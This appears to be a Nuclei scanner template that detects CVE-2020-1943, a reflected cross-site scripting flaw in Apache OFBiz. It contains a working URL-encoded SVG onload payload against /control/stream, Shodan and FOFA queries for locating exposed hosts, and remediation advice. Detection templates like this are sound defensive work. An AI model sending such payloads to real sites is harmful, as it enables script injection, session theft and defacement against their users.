http:
- matchers:
  - part: body
    type: word
    words:
    - <svg/onload=alert(/xss/)>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/control/stream?contentId=%27\%22%3E%3Csvg/onload=alert(/xss/)%3E'
id: CVE-2020-1943
info:
  author: pdteam
  classification:
    cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-1943
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.99394
    epss-score: 0.86811
  description: Apache OFBiz 16.11.01 to 16.11.07 is vulnerable to cross-site scripting
    because data sent with contentId to /control/stream is not sanitized.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query:
    - body="ofbiz"
    - app="apache_ofbiz"
    max-request: 1
    product: ofbiz
    shodan-query:
    - http.html:"ofbiz"
    - ofbiz.visitor=
    vendor: apache
  name: Apache OFBiz <=16.11.07 - Cross-Site Scripting
  reference:
  - https://lists.apache.org/thread.html/rf867d9a25fa656b279b16e27b8ff6fcda689cfa4275a26655c685702%40%3Cdev.ofbiz.apache.org%3E
  - https://s.apache.org/pr5u8
  - https://lists.apache.org/thread.html/r034123f2767830169fd04c922afb22d2389de6e2faf3a083207202bc@%3Ccommits.ofbiz.apache.org%3E
  - https://lists.apache.org/thread.html/r8efd5b62604d849ae2f93b2eb9ce0ce0356a4cf5812deed14030a757@%3Cdev.ofbiz.apache.org%3E
  - https://nvd.nist.gov/vuln/detail/CVE-2020-1943
  remediation: 'Upgrade Apache OFBiz to a version higher than 16.11.07 to mitigate
    this vulnerability.

    '
  severity: medium
  tags: cve2020,cve,apache,xss,ofbiz,vkev,vuln
